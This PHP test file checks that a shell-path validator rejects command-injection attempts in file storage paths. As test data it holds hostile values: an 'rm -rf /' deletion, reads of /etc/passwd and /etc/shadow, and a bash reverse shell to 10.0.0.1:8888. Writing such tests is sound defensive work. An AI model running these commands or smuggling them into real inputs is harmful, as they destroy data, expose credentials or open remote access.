<?php

/**
 * File Storage Security Tests
 *
 * Tests to ensure file storage directory mount functionality is protected against
 * command injection attacks via malicious storage paths.
 *
 * Related Issues: #6 in security_issues.md
 * Related Files:
 *  - app/Models/LocalFileVolume.php
 *  - app/Livewire/Project/Service/Storage.php
 */
test('file storage rejects command injection in path with command substitution', function () {
    expect(fn () => validateShellSafePath('/tmp$(whoami)', 'storage path'))
        ->toThrow(Exception::class);
});

test('file storage rejects command injection with semicolon', function () {
    expect(fn () => validateShellSafePath('/data; rm -rf /', 'storage path'))
        ->toThrow(Exception::class);
});

test('file storage rejects command injection with pipe', function () {
    expect(fn () => validateShellSafePath('/app | cat /etc/passwd', 'storage path'))
        ->toThrow(Exception::class);
});

test('file storage rejects command injection with backticks', function () {
    expect(fn () => validateShellSafePath('/tmp`id`/data', 'storage path'))
        ->toThrow(Exception::class);
});

test('file storage rejects command injection with ampersand', function () {
    expect(fn () => validateShellSafePath('/data && whoami', 'storage path'))
        ->toThrow(Exception::class);
});

test('file storage rejects command injection with redirect operators', function () {
    expect(fn () => validateShellSafePath('/tmp > /tmp/evil', 'storage path'))
        ->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('/data < /etc/shadow', 'storage path'))
        ->toThrow(Exception::class);
});

test('file storage rejects reverse shell payload', function () {
    expect(fn () => validateShellSafePath('/tmp$(bash -i >& /dev/tcp/10.0.0.1/8888 0>&1)', 'storage path'))
        ->toThrow(Exception::class);
});

test('file storage escapes paths properly', function () {
    $path = "/var/www/app's data";
    $escaped = escapeshellarg($path);

    expect($escaped)->toBe("'/var/www/app'\\''s data'");
});

test('file storage escapes paths with spaces', function () {
    $path = '/var/www/my app/data';
    $escaped = escapeshellarg($path);

    expect($escaped)->toBe("'/var/www/my app/data'");
});

test('file storage escapes paths with special characters', function () {
    $path = '/var/www/app (production)/data';
    $escaped = escapeshellarg($path);

    expect($escaped)->toBe("'/var/www/app (production)/data'");
});

test('file storage accepts legitimate absolute paths', function () {
    expect(fn () => validateShellSafePath('/var/www/app', 'storage path'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('/tmp/uploads', 'storage path'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('/data/storage', 'storage path'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('/app/persistent-data', 'storage path'))
        ->not->toThrow(Exception::class);
});

test('file storage accepts paths with underscores and hyphens', function () {
    expect(fn () => validateShellSafePath('/var/www/my_app-data', 'storage path'))
        ->not->toThrow(Exception::class);

    expect(fn () => validateShellSafePath('/tmp/upload_dir-2024', 'storage path'))
        ->not->toThrow(Exception::class);
});
